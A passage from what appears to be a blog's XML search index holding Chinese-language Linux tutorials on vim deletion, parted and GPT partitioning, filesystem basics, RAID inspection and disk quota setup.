&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我现在想删除22222222222和33333333333333333之间的字符只需要这样做： 把1.txt的内容改成： 12311111111111111111111111111222222222222222222222222222222&#123;B3NzaC1yc2EAAAABIwAAAQEAv5oJvuIdaaVUsDOA2FbfnL0K2GbTc05Yg6TGM+8SNleI6bU5MhAy2uP5J4yCrMu43911hEJ2uh1UPycWX1O4xpEgUm8TGIs1HoQySnukv3g121uOLACRj37qqL9j4RRhrUxhunAW3alLSGIV0mxFD0ApyycFoLA/1I3hU7Yyx7tdripwz0FeHHhT3Qjfe9yC8Z6Ptq7cvBPXBBvc/G8pXVq3bnGMtj9Ifmbh7NnTvfHnEZGacf2MR4FSy0MMuNL0k3X5sBlsyP9/rXY9CPOh73eKUhZQoK3uWjwuDRp/dqrxgWDVeg0NZ+0t130pKu/LSREothWoVBu54rrtUUIdb3Sq0xsW4x9EhKGJJHPvBrbGbiDPTKBUaHdQEfmQQPAWeeX1hMC7lCunnfgTzf39Pv/2VpXz2l8NH2Jem0nrS48A6sf4eFz5VIakoRySMQu/6mY4s9aU3arbX+JvUE9s2/7D+JdqJlINtQqRU4V92LQq3BJaSMmKiwnPSytxDtARI3+8I2XXqFCJ5bBY7e&#125;333333333333333333333344444444444444444444444444444 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，2222 和{ 之间没有换行。 把光标移动到第一个{，也就是最后一个2后，然后输入da{ 即可把{}内的字符全部删除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，除了可以使用{ 外，还可以使用 “, ‘, ( 等成对的特殊符号。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实vim还有一个比较常用的那就是v了，用v和d来删除也挺方便的： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开一个文本后，直接按v，然后移动光标可以选中文本，当选中完你想要的文本后，直接按d，就删除了]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[parted 分区 GPT 格式]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F22.%20parted%20%E5%88%86%E5%8C%BA%20GPT%E6%A0%BC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[parted 分区 GPT 格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们讲的fdisk分区工具，它的分区格式为MBR，特点是，最多分4个主分区，磁盘大小不能超过2T。而GPT分区格式，突破了这些限制，它没有主分区、扩展分区、逻辑分区之分，在一块磁盘上最多可以分128个分区出来，支持大于2T的分区，最大卷可达18EB。 相信，随着存储级别的升级，将来的分区格式逐渐会淘汰MBR，而GPT成为主流。 parted 工具常用功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当在命令行输入parted后，进入parted命令的交互模式。输入help会显示帮助信息。下面就简单介绍一下常用的功能 check 简单检查文件系统。建议用其他命令检查文件系统，比如fsck help 显示帮助信息 mklabel 创建分区表， 即是使用msdos（MBR）还是使用gpt，或者是其他方式分区表 mkfs 创建文件系统。该命令不支持ext3 格式，因此建议不使用，最好是用parted分好区，然后退出parted交互模式，用其他命令进行分区，比如：mkfs.ext3 mkpart 创建新分区。格式： 1mkpart PART-TYPE [FS-TYPE] START END &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PART-TYPE 类型主要有primary（主分区）, extended（扩展分区）, logical（逻辑区）. 扩展分区和逻辑分区只对msdos。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fs-type 文件系统类型，主要有fs32，NTFS，ext2，ext3等&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;start end 分区的起始和结束位置。 mkpartfs 建立分区及其文件系统。目前还不支持ext3文件系统，因此不建议使用该功能。最后是分好区后，退出parted，然后用其他命令建立文件系统。 print 输出分区信息。该功能有3个选项，free 显示该盘的所有信息，并显示磁盘剩余空间number 显示指定的分区的信息all 显示所有磁盘信息 resize 调整指定的分区的大小。目前对ext3格式支持不是很好，所以不建议使用该功能。 rescue 恢复不小心删除的分区。如果不小心用parted的rm命令删除了一个分区，那么可以通过rescue功能进行恢复。恢复时需要给出分区的起始和结束的位置。然后parted就会在给定的范围内去寻找，并提示恢复分区。 rm 删除分区。命令格式 rm number 。如：rm 3 就是将编号为3的分区删除 select 选择设备。当输入parted命令后直接回车进入交互模式是，如果有多块硬盘，需要用select 选择要操作的硬盘。如：select /dev/sdb set 设置标记。更改指定分区编号的标志。标志通常有如下几种：boot hidden raid lvm 等。boot 为引导分区，hidden 为隐藏分区，raid 软raid，lvm 为逻辑分区。如：set 3 boot on 设置分区号3 为启动分区注：以上内容为parted常用的功能，由于该工具目前对ext3支持得不是很好，因此有些功能无法应用，比如move（移动分区）和resize等。 parted分区功能事例。 用命令模式 为/dev/sdb创建gpt类型文件分区表,并分500G分区。然后为该分区创建ext3文件系统。并将该分区挂载在/test文件夹下。 1234# parted /dev/sdb mklabel —创建分区表# parted /dev/sdb mkpart ext3 0 500000 —创建500G分区/dev/sdb1# mkfs.ext3 /dev/sdb1 —-将分区/dev/sdb1格式化成ext3格式文件系统# mount /dev/sdb1 /test —将/dev/sdb1 挂载在/test下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果让系统自动挂载/dev/sdb1 需手工编辑/etc/fstab文件。并在文件末尾添加如下内容： 1/dev/sdb1 /test ext3 defaults 0 0 创建大小为4G的交互分区。由于已经创建了500G的/dev/sdb1 ,因此再创建的分区为/dev/sdb2 123# parted /dev/sdb mkpart swap 500000 504000 —创建4G分区/dev/sdb2# mkswap /dev/sdb2 —-将/dev/sdb2创建为交换分区# swapon /dev/sdb2 —-激活/dev/sdb2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果让系统自动挂载/dev/sdb2这个交换分区，需手工编辑/etc/fstab文件。并在文件末尾添加如下内容： 1/dev/sdb2 swap swap defaults 0 0 恢复被误删除的分区(也可以参考testdisk命令)。由于parted直接写磁盘，因此一旦不小心删除了某一分区，建议立即用rescue恢复。下面通过事例来理解恢复过程。 1234# parted /dev/sdb mkpart ext3 504000 514000 —-创建10G分区/dev/sdb3# mkfs.ext3 /dev/sdb3 —将/dev/sdb3格式化成ext3文件系统。# parted /dev/sdb rm 3 —-删除/dev/sdb3# parted /dev/sdb rescue 504000 514000 —依照屏幕提示，输入yes即可恢复被误删除分区]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件系统百科]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F25.%20Linux%20%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%99%BE%E7%A7%91%2F</url>
    <content type="text"><![CDATA[Linux 文件系统百科&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux文件系统中的文件是数据的集合，文件系统不仅包含着文件中的数据而且还有文件系统的结构，所有Linux 用户和程序看到的文件、目录、软连接及文件保护信息等都存储在其中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 最早的文件系统是Minix，但是专门为Linux 设计的文件系统——扩展文件系统第二版或EXT2被设计出来并添加到Linux中，这对Linux产生了重大影响。EXT2文件系统功能强大、易扩充、性能上进行了全面优化，也是所有Linux发布和安装的标准文件系统类型。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个实际文件系统从操作系统和系统服务中分离出来，它们之间通过一个接口层：虚拟文件系统或VFS来通讯。VFS使得Linux可以支持多个不同的文件系统，每个表示一个VFS 的通用接口。由于软件将Linux 文件系统的所有细节进行了转换,所以Linux核心的其它部分及系统中运行的程序将看到统一的文件系统。Linux 的虚拟文件系统允许用户同时能透明地安装许多不同的文件系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux文件系统中，作为一种特殊类型/proc文件系统只存在内存当中，而不占用内存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。/proc文件系统是一个伪文件系统，用户和应用程序可以通过/proc得到系统的信息，并可以改变内核的某些参数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux文件系统中，EXT2文件系统、虚拟文件系统、/proc文件系统是三个具有代表性的文件系统，本论文试图通过对他们的分析来研究Linux文件系统机制。并且在分析这三种文件系统的基础上对Linux文件系统操作进行了解、研究（本论文选取了open和close两种操作进行研究）。在第二部分中将介绍EXT2文件系统；第三部分论述虚拟文件系统的特点；第四部分简要介绍/proc文件系统；最后，介绍两种具体文件系统操作的实现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux中普通文件和目录文件保存在称为块物理设备的磁盘或者磁带上。一套Linux系统支持若干物理盘，每个物理盘可定义一个或者多个文件系统。（类比于微机磁盘分区）。每个文件系统由逻辑块的序列组成，一个逻辑盘空间一般划分为几个用途各不相同的部分，即引导块、超级块、inode区以及数据区等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;引导块：在文件系统的开头，通常为一个扇区，其中存放引导程序，用于读入并启动操作系统；超级块：用于记录文件系统的管理信息。特定的文件系统定义了特定的超级块；inode区（索引节点）：一个文件或目录占据一个索引节点。第一个索引节点是该文件系统的根节点。利用根节点，可以把一个文件系统挂在另一个文件系统的非叶节点上；数据区：用于存放文件数据或者管理数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux最早引入的文件系统类型是MINIX。MINIX文件系统由MINIX操作系统定义，有一定的局限性，如文件名最长14个字符，文件最长64M字节。第一个专门为Linux设计的文件系统是EXT（Extended File System），但目前流行最广的是EXT2。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二代扩展文件系统由Rey Card 设计，其目标是为Linux 提供一个强大的可扩展文件系统。它同时也是Linux界中设计最成功的文件系统。通过VFS的超级块（struct ext2_sb_info ext2_sb）可以访问EXT2的超级块，通过VFS的inode（struct ext2_inode_info ext2_i）可以访问EXT2的inode。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件系统EXT2的源代码在/usr/src/linux/fs/ext2目录下，它的数据结构在文件/usr/src/linux/include/linux/ext2_fs.h以及同一目录下的文件ext2_fs_i.h和ext2_fs_sb.h中定义。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;EXT2文件系统将它所占用的逻辑分区划分成块组（block group），如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和很多文件系统一样, EXT2 建立在数据被保存在数据块中的文件内这个前提下。这些数据块长度相等且这个长度可以变化，某个EXT2 文件系统的块大小在创建（使用mke2fs）时设置。每个文件的大小和刚好大于它的块大小正数倍相等。如果块大小为1024 字节而一个1025 字节长的文件将占据两个1024 字节大小的块。这样你不得不浪费差不多一半的空间。我们通常需要在CPU 的内存利用率和磁盘空间使用上进行折中。而大多数操作系统，包括Linux 在内，为了减少CPU 的工作负载而被迫选择相对较低的磁盘空间利用率。并不是文件中每个块都包含数据，其中有些块被用来包含描叙此文件系统结构的信息。EXT2通过一个inode 结构来描叙文件系统中文件并确定此文件系统的拓扑结构。inode 结构描叙文件中数据占据哪个块以及文件的存取权限、文件修改时间及文件类型。EXT2 文件系统中的每个文件用一个inode 来表示且每个inode 有唯一的编号。文件系统中所有的inode都被保存在inode 表中。 EXT2 目录仅是一个包含指向其目录入口指针的特殊文件（也用inode表示）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对文件系统而言文件仅是一系列可读写的数据块。文件系统并不需要了解数据块应该放置到物理介质上什么位置，这些都是设备驱动的任务。无论何时只要文件系统需要从包含它的块设备中读取信息或数据，它将请求底层的设备驱动读取一个基本块大小整数倍的数据块。EXT2 文件系统将它所使用的逻辑分区划分成数据块组。每个数据块组将那些对文件系统完整性最重要的信息复制出来, 同时将实际文件和目录看作信息与数据块。为了发生灾难性事件时文件系统的修复，这些复制非常有必要。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux如何分大于2T的磁盘分区]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F20.%20Linux%E5%A6%82%E4%BD%95%E5%88%86%E5%A4%A7%E4%BA%8E2T%E7%9A%84%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[Linux如何分大于2T的磁盘分区&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之前一直没有接触过大于2T的磁盘分区的情况，只是听说Linux下大于2T的磁盘分区有问题。当自己遇到的时候，才真实体会到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用fdisk 工具分区的时候，如果分大于2T的分区，会提示： 1Value out of range. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以不能使用fdisk这个分区工具了，要是用parted 来进行分区。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们使用fdisk -l 查看磁盘的时候会发现一段警告： 1234"WARNING: The size of this disk is 8.0 TB (7995995979776 bytes).DOS partition table format can not be used on drives for volumeslarger than 2.2 TB (2199023255040 bytes). Use parted(1) and GUIDpartition table format (GPT)." &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为我的/dev/sdb磁盘是8T，超过了2T. 超过2T只能将磁盘转化成GPT格式，GPT格式的磁盘相当于把原来MBR磁盘中原来保留4个分区表的4*16个字节只保留第一个16个字节，其它的类似于扩展分区，真正的分区表在512字节后，因此对GPT分区表来说是没有4个主分区的限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MBR分区表（主引导）： 支持的最大卷：2T(1T=1024GB) 对分区的限制：最多4个主分区或3个主分区和一个扩展分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GPT分区表（GUID分区表）： 支持最大卷：18EB（1EB=1024T） 对分区的限制：每个磁盘最多支持128个分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好的，下面看看如何使用parted 来分区这个8T的磁盘？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我的打算是，sdb1 分一半也就是4T，sdb2分3T，sdb3分1T. 12345678910111213141516171819202122232425parted /dev/sdb1GNU Parted 1.8.1使用 /dev/sdb1Welcome to GNU Parted! Type 'help' to view a list of commands.(parted) helpcheck NUMBER do a simple check on the file system cp [FROM-DEVICE] FROM-NUMBER TO-NUMBER copy file system to another partition help [COMMAND] prints general help, or help on COMMAND mklabel,mktable LABEL-TYPE create a new disklabel (partition table) mkfs NUMBER FS-TYPE make a FS-TYPE file system on partititon NUMBER mkpart PART-TYPE [FS-TYPE] START END make a partition mkpartfs PART-TYPE FS-TYPE START END make a partition with a file system move NUMBER START END move partition NUMBER name NUMBER NAME name partition NUMBER as NAME print [free|NUMBER|all] display the partition table, a partition, or all devices quit exit program rescue START END rescue a lost partition near START and END resize NUMBER START END resize partition NUMBER and its file system rm NUMBER delete partition NUMBER select DEVICE choose the device to edit set NUMBER FLAG STATE change the FLAG on partition NUMBER toggle [NUMBER [FLAG]] toggle the state of FLAG on partition NUMBER unit UNIT set the default unit to UNIT version displays the current version of GNU Parted and copyright information(parted) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以先使用 “help” 命令获取帮助。常用命令有： mklabel GPT：建立磁盘标签 print ：如果没有任何分区，它查看磁盘可用空间，当分区后，它会打印出分区情况 primary 0% n% ：创建主分区，n为要分的分区占整个磁盘的百分比.（mkpart extended创建扩展分区），例如我这里要分一个占一半（4T）的分区，则写 0% 50%, 然后继续分3T “mkpart primary 51% 90%”, 再分一个1T的 “mkpart primary 91% 100%” quit ：分区完后，直接quit即可，不像fdisk分区的时候，还需要保存一下，这个不用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，我的命令为： 123456(parted) mklabel GPT(parted) print(parted) mkpart primary 0% 50%(parted) mkpart primary 51% 90%(parted) mkpart primary 91% 100%(parted) quit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分区完了首先需要把让内核知道添加新分区了： 1partprobe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后就该格式化了: 123mkfs.ext3 /dev/sdb1mkfs.ext3 /dev/sdb2mkfs.ext3 /dev/sdb3]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 系统下查看raid信息，以及磁盘信息]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F21.%20Linux%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%9F%A5%E7%9C%8Braid%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BB%A5%E5%8F%8A%E7%A3%81%E7%9B%98%E4%BF%A1%E6%81%AF%2F</url>
    <content type="text"><![CDATA[Linux 系统下查看raid信息，以及磁盘信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时想知道服务器上有几块磁盘，如果没有做raid，则可以简单使用fdisk -l 就可以看到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是做了raid呢，这样就看不出来了。那么如何查看服务器上做了raid？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;软件raid：只能通过Linux系统本身来查看 1cat /proc/mdstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到raid级别，状态等信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;硬件raid： 最佳的办法是通过已安装的raid厂商的管理工具来查看，有cmdline，也有图形界面。如Adaptec公司的硬件卡就可以通过下面的命令进行查看： 1# /usr/dpt/raidutil -L all &#160;&#160;&#160;&#160;&#160;&#160;可以看到非常详细的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然更多情况是没有安装相应的管理工具，只能依靠Linux本身的话一般我知道的是两种方式： 123# dmesg |grep -i raid # cat /proc/scsi/scsi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示的信息差不多，raid的厂商，型号，级别，但无法查看各块硬盘的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下信息作为案例， 命令为 12345678910111213141516171819202122# fdisk -l Disk /dev/sda: 145.9 GB, 145999527936 bytes255 heads, 63 sectors/track, 17750 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System/dev/sda1 * 1 13 104391 83 Linux/dev/sda2 14 17750 142472452+ 8e Linux LVM# cat /proc/scsi/scsiAttached devices:Host: scsi0 Channel: 00 Id: 00 Lun: 00 Vendor: SEAGATE Model: ST3146356SS Rev: HS09 Type: Direct-Access ANSI SCSI revision: 05Host: scsi0 Channel: 00 Id: 01 Lun: 00 Vendor: SEAGATE Model: ST3146356SS Rev: HS09 Type: Direct-Access ANSI SCSI revision: 05Host: scsi0 Channel: 01 Id: 00 Lun: 00 Vendor: Dell Model: VIRTUAL DISK Rev: 1028 Type: Direct-Access ANSI SCSI revision: 05 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过以上信息可以看出，该服务器有两块磁盘。品牌是希捷的，磁盘代号为 ST3146356SS，如果你熟悉细节磁盘的代号命名规则，你会轻易判定该磁盘大小为146G 。再根据fdisk 得出的结果可以判定，该服务器是拿两块146G的硬盘做的raid1.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磁盘配额]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F27.%E7%A3%81%E7%9B%98%E9%85%8D%E9%A2%9D%2F</url>
    <content type="text"><![CDATA[磁盘配额&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘配合其实就是给每个用户分配一定的磁盘额度，只允许他使用这个额度范围内的磁盘空间。在linux系统中，是多用户多任务的环境，所以会有很多人共用一个磁盘的情况。针对每个用户去限定一定量的磁盘空间是有必要的，这样才显得公平。随着硬件成本的降低，服务器上的磁盘资源似乎不再刻意的去限制了，所以磁盘配额也就可有可无了，但是也需要了解一下这部分内容，用到时必须会操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux中，用来管理磁盘配额的东西就是quota了。如果linux上没有quota，则需要安装这个软件包 quota-3.13-5.el5.RPM （其实版本是多少无所谓了，关键是这个软件包）。quota在实际应用中是针对整个分区进行限制的。比如，如果我们限制了/dev/sdb1这个分区，而/dev/sdb1 是挂载在/home 目录下的，那么/home 所有目录都会受到限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;quota 这个模块主要分为quota 、quotacheck 、quotaoff 、quotaon 、quotastats 、edquota 、setquota 、warnquota 、repquota这几个命令，下面就分别介绍这些命令。 命令 : quota&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quota” 用来显示某个组或者某个使用者的限额。 语法：1quota [-guvs] [user,group] 基本参数 -g 显示某个组的限额 -u 显示某个用户的限额 -v 显示的意思 -s 选择inod或硬盘空间来显示 命令 : quotacheck&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quotacheck” 用来扫描某一个磁盘的quota空间。 语法：1quotacheck [-auvg] /path 基本参数 -a 扫描所有已经mount的具有quota支持的磁盘 -u 扫描某个使用者的文件以及目录 -g 扫描某个组的文件以及目录 -v 显示扫描过程 -m 强制进行扫描 命令 : edquota&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“edquota” 用来编辑某个用户或者组的quota值。 语法：1edquota [-u user] [-g group] [-t] 基本参数 -u 编辑某个用户的quota -g 编辑某个组的quota -t 编辑宽限时间 -p 拷贝某个用户或组的quota到另一个用户或组 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当运行 edquota -u user 时，系统会打开一个文件，你会看到这个文件中有7列，它们分别代表的含义是： “Filesystem” 磁盘分区，如/dev/sdb5 “blocks” 当前用户在当前的Filesystem中所占用的磁盘容量，单位是Kb。该值请不要修改。 “soft/hard” 当前用户在该Filesystem内的quota值，soft指的是最低限额，可以超过这个值，但必须要在宽限时间内将磁盘容量降低到这个值以下。hard指的是最高限额，即不能超过这个值。当用户的磁盘使用量高于soft值时，系统会警告用户，提示其要在宽限时间内把使用空间降低到soft值之下。 “inodes” 目前使用掉的inode的状态，不用修改。 命令 : quotaon&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quotaon” 用来启动quota，在编辑好quota后，需要启动才能是quota生效 语法：1quotaon [-a] [-uvg directory] 基本参数 -a 全部设定的quota启动 -u 启动某个用户的quota -g 启动某个组的quota -s 显示相关信息 命令 : quotaoff&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“quotaoff” 用来关闭quota, 该命令常用只有一种情况 quotaoff -a 关闭全部的quota. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上讲了很多quota的相关命令，那么接下来阿铭教你如何在实践应用中去做这个磁盘配额。整个执行过程如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先先确认一下，/home目录是不是单独的挂载在一个分区下，用df 查看即可。 1234文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda3 14347632 1899376 11719424 14% /tmpfs 163308 0 163308 0% /dev/shm/dev/sda1 99150 26808 67222 29% /boot &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例linux系统中，/home并没有单独占用一个分区。所以需要把/home目录挂载在一个单独的分区下，因为quota是针对分区来限额的。下面把 /dev/sdb5 挂载到/home 目录下， 编辑 /etc/fstab 把刚才添加的那行修改为： 1UUID=c61117ca-9176-4d0b-be4d-1b0f434359a7 /home ext4 defaults 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存 /etc/fstab 后，运行 mount -a 命令挂载全部的分区。 1234567[root@localhost ~]# mount -a[root@localhost ~]# df -h文件系统 容量 已用 可用 已用%% 挂载点/dev/sda3 14G 1.9G 12G 14% /tmpfs 160M 0 160M 0% /dev/shm/dev/sda1 97M 27M 66M 29% /boot/dev/sdb5 989M 18M 921M 2% /home &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时的 /home 为一个单独分区了。 建立测试账户首先建立一个test用户，则同时建立了一个test组。其中uid和gid都为511 ，然后又建立一个test1账号，使其加入test组，查看/etc/passwd文件发现test和test1用户的gid都为511. 123456[root@localhost ~]# useradd test[root@localhost ~]# grep test /etc/passwdtest:x:511:511::/home/test:/bin/bash[root@localhost ~]# useradd -g 511 test1[root@localhost ~]# grep test1 /etc/passwdtest1:x:512:511::/home/test1:/bin/bash 打开磁盘的quota功能默认linux并没有对任何分区做quota的支持，所以需要我们手动打开磁盘的quota功能，你是否记得，在前面内容中分析/etc/fstab文件的第四列时讲过这个quota选项（usrquota, grpquota），没错，要想打开这个磁盘的quota支持就是需要修改这个第四列的。用vi编辑/etc/fstab 编辑刚才加的那一行，如下: 1UUID=c61117ca-9176-4d0b-be4d-1b0f434359a7 /home ext4 defaults,usrquota,grpquota 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存 /etc/fstab 后，重新挂载/home分区。 1234567891011[root@localhost ~]# umount /home/[root@localhost ~]# mount -a[root@localhost ~]# mount/dev/sda3 on / type ext4 (rw)proc on /proc type proc (rw)sysfs on /sys type sysfs (rw)devpts on /dev/pts type devpts (rw,gid=5,mode=620)tmpfs on /dev/shm type tmpfs (rw)/dev/sda1 on /boot type ext4 (rw)none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)/dev/sdb5 on /home type ext4 (rw,usrquota,grpquota) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 mount 命令可以查看到 /home 分区已经加上了 “usrquota,grpquota” 两个配额相关的参数。 扫描磁盘的使用者使用状况，并产生重要的aquota.group与aquota.user这一步就需要用到quotacheck了，aquota.group与aqouta.user分别是组以及用户磁盘配额需要的配置文件。如果没有这两个文件，则磁盘配额是不会生效的。 1[root@localhost ~]# quotacheck -augv &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可能会有一些错误信息，不要管它。看一看/home分区下是否多了两个文件(aquota.group, aquota.user) 12345678[root@localhost ~]# ll /home/总用量 44-rw------- 1 root root 7168 5月 12 02:07 aquota.group-rw------- 1 root root 8192 5月 12 02:07 aquota.userdrwxr-xr-x 2 root root 4096 5月 12 00:11 dir1drwx------ 2 root root 16384 5月 11 23:18 lost+founddrwx------ 3 test test 4096 5月 12 01:59 testdrwx------ 3 test1 test 4096 5月 12 02:00 test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有了，则可以进入下一步了。 启动quota配额 123[root@localhost ~]# quotaon -av/dev/sdb5 [/home]: group quotas turned on/dev/sdb5 [/home]: user quotas turned on 编辑用户磁盘配额先来设定test账户的配额，然后直接把test的配额拷贝给test1即可。这里就需要用到edquota了。 1[root@localhost ~]# edquota -u test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将下面内容 1/dev/sdb5 20 0 0 5 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 1/dev/sdb5 20 20000 30000 5 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中单位是Kb，所以soft 值大约为20Mb，hard值为30Mb，保存这个文件，保存的方式跟vi一个文件的方式一样的。下面将test的配额复制给test1. 1[root@localhost ~]# edquota -p test test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面继续设定宽限时间： 1[root@localhost ~]# edquota -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将7days 改为 1days 1/dev/sdb5 1days 1days &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面查看一下test以及test1用户的配额吧。 1234567[root@localhost ~]# quota -uv test test1Disk quotas for user test (uid 511): Filesystem blocks quota limit grace files quota limit grace /dev/sdb5 20 20000 30000 5 0 0Disk quotas for user test1 (uid 512): Filesystem blocks quota limit grace files quota limit grace /dev/sdb5 20 20000 30000 5 0 0 编辑组磁盘配额 1[root@localhost ~]# edquota -g test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 1/dev/sdb5 40 40000 50000 10 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定组test的soft配额值为40M，hard值为50M。下面查看组test的配额。 1234[root@localhost ~]# quota -gv testDisk quotas for group test (gid 511): Filesystem blocks quota limit grace files quota limit grace /dev/sdb5 40 40000 50000 10 0 0 设定开机启动前面已经讲到启动磁盘配额的命令是 quotaon -aug 所以要想开机启动，只需将这条命令加入到 /etc/rc.d/rc.local文件即可。 1[root@localhost ~]# echo "quotaon -aug" &gt;&gt; /etc/rc.d/rc.local]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim百科]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F29.%20vim%E7%99%BE%E7%A7%91%2F</url>
